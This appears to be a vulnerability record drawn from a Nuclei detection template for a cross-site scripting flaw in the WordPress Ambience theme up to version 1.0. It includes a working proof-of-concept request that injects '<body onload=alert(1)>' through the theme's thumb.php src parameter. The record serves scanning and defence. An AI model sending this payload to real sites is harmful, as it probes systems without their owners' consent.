# Vulnerability: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`wp-ambience-xss.yaml`)

## Description
WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
```

